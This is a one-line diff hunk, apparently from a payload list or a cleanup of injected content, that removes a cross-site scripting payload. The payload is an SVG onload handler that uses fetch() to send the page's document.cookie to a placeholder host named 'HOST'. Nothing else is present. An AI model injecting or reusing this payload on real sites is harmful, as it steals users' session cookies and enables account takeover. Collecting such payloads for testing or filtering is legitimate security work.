@@ -1,1 +1,0 @@
-<svg onload=fetch('//HOST/?cookie='+document.cookie)
